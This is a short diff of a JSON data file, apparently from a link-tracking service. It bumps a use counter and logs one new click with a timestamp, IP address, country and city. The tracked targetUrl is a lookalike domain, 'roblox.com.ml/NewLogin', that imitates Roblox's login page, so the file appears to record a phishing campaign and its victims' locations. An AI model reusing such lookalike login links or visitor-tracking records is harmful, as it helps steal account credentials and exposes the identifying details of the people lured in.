@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 746,
+    "useCount": 747,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6080,6 +6080,14 @@
         "city": "Pittsburgh",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777150042562,
+        "ip": "51.198.45.71",
+        "country": "United Kingdom",
+        "city": "Thatcham",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
